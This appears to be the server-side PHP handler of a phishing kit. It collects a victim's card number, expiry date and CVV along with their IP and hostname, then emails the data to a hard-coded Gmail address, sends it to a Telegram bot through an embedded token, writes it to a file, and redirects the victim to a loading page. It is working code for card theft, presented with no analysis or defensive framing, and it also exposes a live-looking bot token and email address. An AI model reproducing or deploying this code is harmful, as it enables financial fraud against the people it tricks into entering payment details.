<?php
include ('../at/abot.php');
if(empty($_POST['cr1'])) {header("Location: index1.php");}
include ('./INFO.php');
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);

$message .= "Cc              : ".$_POST['cpcCardHolderCard']."\n";
$message .= "EXP              : ".$_POST['cpcCardExpirationMonth']."/".$_POST['cpcCardExpirationYear']."\n";
$message .= "C-V              : ".$_POST['cpcCardCvv']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$send = "simoboukhari06@gmail.com";
$subject = "LOOZA by MOLAHA | $ip ";
$headers = "From:COREO<webiha@sa7tu.com>";
$tok2="2118439621:AAE_HVnBdvl9HhqoVy2BLQz0-C51g2O9j4M";
$tok="2118439621:AAE_HVnBdvl9HhqoVy2BLQz0-C51g2O9j4M";
$uid=$id;
$request=[
    'chat_id' => $uid,
    'text' => $subject."
".$message 
];

file_get_contents($request_url2);
mail($send,$subject,$message,$headers);
fwrite($file,$message); 
header("Location: load.html");

?>